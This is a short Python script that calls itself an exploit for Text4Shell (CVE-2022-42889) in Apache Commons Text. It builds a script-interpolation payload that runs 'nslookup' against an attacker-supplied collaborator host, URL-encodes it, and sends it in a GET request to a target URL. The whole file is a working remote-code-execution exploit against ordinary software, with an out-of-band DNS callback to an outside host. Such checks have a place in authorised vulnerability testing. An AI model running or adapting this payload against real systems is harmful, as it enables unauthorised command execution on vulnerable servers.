import argparse
import urllib.parse
import requests

def create_payload(collab):
    cmd = f"nslookup {collab}"
    payload = '${script:javascript:java.lang.Runtime.getRuntime().exec(\'' + cmd.strip() + '\')}'
    return urllib.parse.quote(payload)

parser = argparse.ArgumentParser(description='Text4Shell (Java library Apache Commons Text CVE-2022-42889) exploit')
parser.add_argument('-u', '--url', type=str, help='Vulnerable URL with {{exploit}} placeholder')
parser.add_argument('-c', '--collab', type=str, help='Collaborator URL for payload')
args = parser.parse_args()

if not args.url or not args.collab:
    print("Both -u and -c arguments are required.")
    exit(1)

payload = create_payload(args.collab)

new_url = args.url.replace("{{exploit}}", payload)
response = requests.get(new_url)
